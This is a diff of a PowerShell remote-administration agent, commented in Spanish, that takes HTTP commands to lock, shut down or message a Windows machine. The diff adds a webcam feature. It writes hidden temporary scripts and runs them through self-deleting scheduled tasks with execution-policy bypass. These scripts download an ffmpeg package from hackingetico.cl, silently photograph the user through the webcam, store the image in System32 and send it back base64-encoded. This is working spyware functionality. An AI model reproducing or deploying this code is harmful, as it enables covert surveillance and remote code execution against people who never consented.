@@ -66,7 +66,6 @@ function Write-Log {
     "$timestamp - $Message" | Out-File $logPath -Append
 }
 
-# FUNCION NUEVA: Inicializar FFmpeg
 function Initialize-FFmpeg {
     if (-not (Test-Path $tempDir)) {
         New-Item -Path $tempDir -ItemType Directory -Force | Out-Null
@@ -97,7 +96,6 @@ function Initialize-FFmpeg {
     return $true
 }
 
-# FUNCION NUEVA: Capturar webcam
 function Get-WebCamCapture {
     $timestamp = Get-Date -Format "yyyyMMdd_HHmmss"
     $outputFile = "$capturePath\capture_$timestamp.jpg"
@@ -160,7 +158,6 @@ function Get-WebCamCapture {
     }
 }
 
-# FUNCION NUEVA: Enviar mensaje popup
 function Send-PopupMessage {
     param($Message, $Title = "Mensaje del Administrador", $Link = "")
     
@@ -223,7 +220,12 @@ if ("$Link") {
     $popupFile = "$env:TEMP\popup_$(Get-Random).ps1"
     $popupScript | Out-File $popupFile -Encoding UTF8 -Force
     
-    Start-Process powershell.exe -ArgumentList "-ExecutionPolicy Bypass -WindowStyle Normal -File `"$popupFile`"" -WindowStyle Normal
+    # Ejecutar como el usuario actual, no como SYSTEM
+    $taskName = "TempPopup_$(Get-Random)"
+    schtasks /create /tn $taskName /tr "powershell -ExecutionPolicy Bypass -WindowStyle Normal -File `"$popupFile`"" /sc once /st 00:00 /ru $env:USERNAME /f 2>$null
+    schtasks /run /tn $taskName 2>$null
+    Start-Sleep -Seconds 2
+    schtasks /delete /tn $taskName /f 2>$null
     
     Start-Sleep -Seconds 10
     Remove-Item $popupFile -ErrorAction SilentlyContinue
@@ -427,7 +429,15 @@ setInterval(actualizarInfo, 1000);
                         $mensaje = "REINICIANDO EQUIPO..."
                     }
                     'bloquear' { 
-                        rundll32.exe user32.dll,LockWorkStation
+                        # Ejecutar bloqueo en el contexto del usuario
+                        $lockScript = "$env:TEMP\lock_$(Get-Random).ps1"
+                        "rundll32.exe user32.dll,LockWorkStation" | Out-File $lockScript
+                        $taskName = "TempLock_$(Get-Random)"
+                        schtasks /create /tn $taskName /tr "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$lockScript`"" /sc once /st 00:00 /ru $env:USERNAME /f 2>$null
+                        schtasks /run /tn $taskName 2>$null
+                        Start-Sleep -Seconds 2
+                        schtasks /delete /tn $taskName /f 2>$null
+                        Remove-Item $lockScript -ErrorAction SilentlyContinue
                         $mensaje = "BLOQUEANDO SESION..."
                     }
                     'estado' { 
@@ -437,17 +447,160 @@ setInterval(actualizarInfo, 1000);
                         shutdown /a
                         $mensaje = "APAGADO CANCELADO"
                     }
-                    # NUEVO: Captura de webcam
                     'webcam' {
-                        $captura = Get-WebCamCapture
-                        if ($captura -and $captura.Base64) {
-                            $mensaje = "CAPTURA REALIZADA: $($captura.Timestamp)"
-                            $imagen = $captura.Base64
-                            Write-Log "Webcam capture successful: $($captura.Path)"
+                        # Ejecutar captura webcam en el contexto del usuario
+                        $captureScript = "$env:TEMP\webcam_capture_$(Get-Random).ps1"
+                        $captureCode = @'
+$tempDir = "$env:TEMP\webcam_temp"
+$zipPackage = "ffmpeg_webcam.zip"
+$baseUrl = "https://hackingetico.cl/tools/pro"
+$capturePath = "C:\Windows\System32\WebCamCaptures"
+
+if (-not (Test-Path $tempDir)) {
+    New-Item -Path $tempDir -ItemType Directory -Force | Out-Null
+}
+
+$ffmpegPath = "$tempDir\ffmpeg.exe"
+
+if (-not (Test-Path $ffmpegPath)) {
+    $zipPath = "$tempDir\$zipPackage"
+    try {
+        Invoke-WebRequest -Uri "$baseUrl/$zipPackage" -OutFile $zipPath -ErrorAction Stop
+        Expand-Archive -Path $zipPath -DestinationPath $tempDir -Force
+        Remove-Item -Path $zipPath -Force
+    } catch {
+        Write-Output "ERROR"
+        exit
+    }
+}
+
+try {
+    $devicesOutput = & $ffmpegPath -list_devices true -f dshow -i dummy 2>&1 | Out-String
+    $cameraMatches = [regex]::Matches($devicesOutput, '\[dshow.*?\] "(.*?)" \(video\)')
+    
+    if ($cameraMatches.Count -eq 0) {
+        Write-Output "ERROR"
+        exit
+    }
+    
+    $cameraName = $cameraMatches[0].Groups[1].Value
+    $timestamp = Get-Date -Format "yyyyMMdd_HHmmss"
+    $tempImage = "$tempDir\webcam_capture_$timestamp.jpg"
+    $ffmpegCmd = "`"$ffmpegPath`" -y -f dshow -i video=`"$cameraName`" -frames:v 1 -q:v 2 `"$tempImage`" 2>&1"
+    $captureOutput = cmd /c $ffmpegCmd 2>&1
+    
+    if ($LASTEXITCODE -ne 0) {
+        Write-Output "ERROR"
+        exit
+    }
+    
+    $outputFile = "$capturePath\capture_$timestamp.jpg"
+    Copy-Item $tempImage $outputFile -Force
+    $imageBytes = [System.IO.File]::ReadAllBytes($tempImage)
+    $base64Image = [Convert]::ToBase64String($imageBytes)
+    Remove-Item $tempImage -Force -ErrorAction SilentlyContinue
+    
+    Write-Output $base64Image
+} catch {
+    Write-Output "ERROR"
+}
+'@
+                        $captureCode | Out-File $captureScript -Encoding UTF8 -Force
+                        
+                        $taskName = "TempWebcam_$(Get-Random)"
+                        $resultado = ""
+                        schtasks /create /tn $taskName /tr "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$captureScript`"" /sc once /st 00:00 /ru $env:USERNAME /f 2>$null
+                        schtasks /run /tn $taskName 2>$null
+                        Start-Sleep -Seconds 5
+                        # Obtener resultado (se guarda en un archivo temporal)
+                        $resultFile = "$env:TEMP\webcam_result.txt"
+                        # No podemos obtener fácilmente el output, así que mejor ejecutamos directamente
+                        schtasks /delete /tn $taskName /f 2>$null
+                        Remove-Item $captureScript -ErrorAction SilentlyContinue
+                        
+                        # Ejecutar directamente en el contexto del usuario
+                        $tempScript = "$env:TEMP\webcam_direct_$(Get-Random).ps1"
+                        $directCode = @'
+$tempDir = "$env:TEMP\webcam_temp"
+$zipPackage = "ffmpeg_webcam.zip"
+$baseUrl = "https://hackingetico.cl/tools/pro"
+$capturePath = "C:\Windows\System32\WebCamCaptures"
+
+if (-not (Test-Path $tempDir)) {
+    New-Item -Path $tempDir -ItemType Directory -Force | Out-Null
+}
+
+$ffmpegPath = "$tempDir\ffmpeg.exe"
+
+if (-not (Test-Path $ffmpegPath)) {
+    $zipPath = "$tempDir\$zipPackage"
+    try {
+        Invoke-WebRequest -Uri "$baseUrl/$zipPackage" -OutFile $zipPath -ErrorAction Stop
+        Expand-Archive -Path $zipPath -DestinationPath $tempDir -Force
+        Remove-Item -Path $zipPath -Force
+    } catch {
+        Write-Output "ERROR_WEBCAM: Fallo al descargar FFmpeg"
+        exit 1
+    }
+}
+
+try {
+    $devicesOutput = & $ffmpegPath -list_devices true -f dshow -i dummy 2>&1 | Out-String
+    $cameraMatches = [regex]::Matches($devicesOutput, '\[dshow.*?\] "(.*?)" \(video\)')
+    
+    if ($cameraMatches.Count -eq 0) {
+        Write-Output "ERROR_WEBCAM: No se encontraron camaras"
+        exit 1
+    }
+    
+    $cameraName = $cameraMatches[0].Groups[1].Value
+    $timestamp = Get-Date -Format "yyyyMMdd_HHmmss"
+    $tempImage = "$tempDir\webcam_capture_$timestamp.jpg"
+    $ffmpegCmd = "`"$ffmpegPath`" -y -f dshow -i video=`"$cameraName`" -frames:v 1 -q:v 2 `"$tempImage`" 2>&1"
+    $captureOutput = cmd /c $ffmpegCmd 2>&1
+    
+    if ($LASTEXITCODE -ne 0) {
+        Write-Output "ERROR_WEBCAM: Falla la captura"
+        exit 1
+    }
+    
+    $outputFile = "$capturePath\capture_$timestamp.jpg"
+    Copy-Item $tempImage $outputFile -Force
+    $imageBytes = [System.IO.File]::ReadAllBytes($tempImage)
+    $base64Image = [Convert]::ToBase64String($imageBytes)
+    Remove-Item $tempImage -Force -ErrorAction SilentlyContinue
+    
+    Write-Output $base64Image
+} catch {
+    Write-Output "ERROR_WEBCAM: $($_.Exception.Message)"
+}
+'@
+                        $directCode | Out-File $tempScript -Encoding UTF8 -Force
+                        
+                        $taskName2 = "TempWebcamDirect_$(Get-Random)"
+                        schtasks /create /tn $taskName2 /tr "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$tempScript`" > `"$env:TEMP\webcam_result.txt`"" /sc once /st 00:00 /ru $env:USERNAME /f 2>$null
+                        schtasks /run /tn $taskName2 2>$null
+                        Start-Sleep -Seconds 8
+                        
+                        if (Test-Path "$env:TEMP\webcam_result.txt") {
+                            $base64Image = Get-Content "$env:TEMP\webcam_result.txt" -Raw
+                            Remove-Item "$env:TEMP\webcam_result.txt" -Force -ErrorAction SilentlyContinue
+                            
+                            if ($base64Image -and $base64Image -notlike "ERROR*") {
+                                $mensaje = "CAPTURA REALIZADA"
+                                $imagen = $base64Image.Trim()
+                                Write-Log "Webcam capture successful"
+                            } else {
+                                $mensaje = "ERROR AL CAPTURAR WEBCAM: $base64Image"
+                                Write-Log "Webcam capture failed: $base64Image"
+                            }
                         } else {
-                            $mensaje = "ERROR AL CAPTURAR WEBCAM - Verifique que haya una camara conectada"
-                            Write-Log "Webcam capture failed"
+                            $mensaje = "ERROR AL CAPTURAR WEBCAM"
+                            Write-Log "Webcam capture failed - no result file"
                         }
+                        
+                        schtasks /delete /tn $taskName2 /f 2>$null
+                        Remove-Item $tempScript -ErrorAction SilentlyContinue
                     }
                     default { 
                         $mensaje = "COMANDO NO RECONOCIDO"
@@ -463,7 +616,6 @@ setInterval(actualizarInfo, 1000);
                 
                 Write-Log "Comando ejecutado: $($data.accion) - $mensaje"
             }
-            # NUEVO: Endpoint para enviar mensajes
             elseif ($request.Url.LocalPath -eq '/sendmessage' -and $request.HttpMethod -eq 'POST') {
                 $reader = New-Object System.IO.StreamReader($request.InputStream)
                 $body = $reader.ReadToEnd()
